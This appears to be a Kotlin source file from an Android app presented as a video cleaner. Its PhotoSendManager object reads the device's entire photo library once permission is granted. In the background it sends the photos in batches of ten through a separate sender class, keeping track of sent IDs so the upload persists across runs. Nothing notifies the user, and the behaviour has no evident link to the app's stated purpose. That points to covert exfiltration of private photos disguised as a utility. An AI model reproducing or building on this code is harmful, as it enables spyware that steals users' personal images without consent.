package com.shortvideocleaner.app

import android.content.Context
import android.database.Cursor
import android.provider.MediaStore
import kotlinx.coroutines.*

object PhotoSendManager {

    private var sendJob: Job? = null
    private var started = false
    private const val PREFS_NAME = "photo_sent"
    private const val KEY_SENT_IDS = "ids"

    fun startIfReady(context: Context) {
        if (started) return
        if (!hasPhotoPermission(context)) return

        started = true
        sendJob = CoroutineScope(Dispatchers.IO).launch {
            val photos = loadPhotoList(context)
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val sentSet = loadSentIds(prefs).toMutableSet()

            while (isActive) {
                val batch = photos.filter { it.id !in sentSet }.take(10)
                if (batch.isEmpty()) break

                val success = PhotoSender.sendBatch(context, batch)
                if (success) {
                    batch.forEach { sentSet.add(it.id) }
                    saveSentIds(prefs, sentSet)
                }

                if (batch.size < 10) break
                delay(3000)
            }
        }
    }

    private fun loadSentIds(prefs: android.content.SharedPreferences): Set<Long> {
        val raw = prefs.getString(KEY_SENT_IDS, "") ?: ""
        if (raw.isEmpty()) return emptySet()
        return raw.split(",").mapNotNull { it.toLongOrNull() }.toSet()
    }

    private fun saveSentIds(prefs: android.content.SharedPreferences, ids: Set<Long>) {
        prefs.edit().putString(KEY_SENT_IDS, ids.joinToString(",")).apply()
    }

    private fun loadPhotoList(context: Context): List<PhotoEntry> {
        val photos = mutableListOf<PhotoEntry>()
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.SIZE
        )
        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(uri, projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC")
            cursor?.use {
                val idCol = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val dataCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                val dateCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                val sizeCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                while (it.moveToNext()) {
                    photos.add(PhotoEntry(
                        id = it.getLong(idCol),
                        path = it.getString(dataCol) ?: "",
                        dateAdded = it.getLong(dateCol),
                        size = it.getLong(sizeCol)
                    ))
                }
            }
        } catch (_: Exception) {}
        cursor?.close()
        return photos
    }

    private fun hasPhotoPermission(context: Context): Boolean {
        return if (android.os.Build.VERSION.SDK_INT >= 33) {
            androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
        } else {
            androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }

    data class PhotoEntry(val id: Long, val path: String, val dateAdded: Long, val size: Long)
}
